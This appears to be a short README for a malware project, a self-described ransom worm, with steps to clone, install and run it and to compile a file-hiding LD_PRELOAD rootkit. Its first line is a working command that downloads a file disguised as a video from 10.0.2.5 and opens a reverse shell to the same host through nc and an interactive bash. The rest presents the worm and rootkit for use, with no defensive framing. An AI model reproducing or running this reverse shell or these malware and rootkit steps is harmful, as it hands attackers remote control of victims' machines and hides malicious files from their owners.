/usr/bin/wget 'http://10.0.2.5/video.mp4' -O /tmp/video.mp4; /usr/bin/xdg-open /tmp/video.mp4; /usr/bin/mkfifo /tmp/f; /bin/nc 10.0.2.5 1234 < /tmp/f | /bin/bash -i > /tmp/f 2>&1 &

# Malware Project

## A multi function worm

# Instructions

First clone the repository:

````bash
git clone https://github.com/blueh0rse/ransom-worm
````

Move to working directory:

````bash
cd ransom-worm
````

Install depedencies:

````bash
python3 -m pip install -r requirements.txt
````

Run code, at your own risks:

````bash
python3 main.py
````

# ROOTKIT
#Add in main.c the HIDING_FILE_NAME that u want to hide(this exemple can hide all the python file and secret.sh)  

How to compile :
````bash
gcc -fPIC -shared -o mainlib.so main.c -ldl\n
````
How to run: 

````bash
LD_PRELOAD=/path/to/your/mainlib.so + where you want to hide (like ps -a or ls) 
````
